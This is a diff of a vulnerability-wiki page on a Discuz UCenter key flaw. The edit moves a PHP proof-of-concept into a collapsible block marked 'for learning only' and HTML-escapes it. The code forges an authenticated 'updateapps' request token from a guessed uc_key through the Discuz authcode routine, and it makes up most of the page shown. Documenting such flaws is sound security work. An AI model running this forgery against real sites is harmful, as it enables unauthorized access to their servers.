@@ -15,11 +15,13 @@ tags:
 
 最新版下载地址：https://gitee.com/Discuz/Discuz
 
-```php
-<?php
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-php">&lt;?php
     $uc_key="123456";//
     $time = time() + 720000;
-    $str = "time=".$time."&action=updateapps";
+    $str = "time=".$time."&amp;action=updateapps";
     $code = authcode($str,"ENCODE",$uc_key);
     $code = str_replace('+','%2b', $code) ;
     $code = str_replace('/','%2f', $code) ;
@@ -42,18 +44,18 @@ tags:
     $box = range(0, 255);
  
     $rndkey = array();
-    for($i = 0; $i <= 255; $i++) {
+    for($i = 0; $i &lt;= 255; $i++) {
         $rndkey[$i] = ord($cryptkey[$i % $key_length]);
     }
  
-    for($j = $i = 0; $i < 256; $i++) {
+    for($j = $i = 0; $i &lt; 256; $i++) {
         $j = ($j + $box[$i] + $rndkey[$i]) % 256;
         $tmp = $box[$i];
         $box[$i] = $box[$j];
         $box[$j] = $tmp;
     }
  
-    for($a = $j = $i = 0; $i < $string_length; $i++) {
+    for($a = $j = $i = 0; $i &lt; $string_length; $i++) {
         $a = ($a + 1) % 256;
         $j = ($j + $box[$a]) % 256;
         $tmp = $box[$a];
@@ -63,7 +65,7 @@ tags:
     }
  
     if($operation == 'DECODE') {
-        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
+        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
             return substr($result, 26);
         } else {
                 return '';
@@ -73,8 +75,9 @@ tags:
     }
  
 }
-?>
-```
+?&gt;</code></pre>
+
+</details>
 
 ![image-20221206155432361](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/image-20221206155432361.png)
 
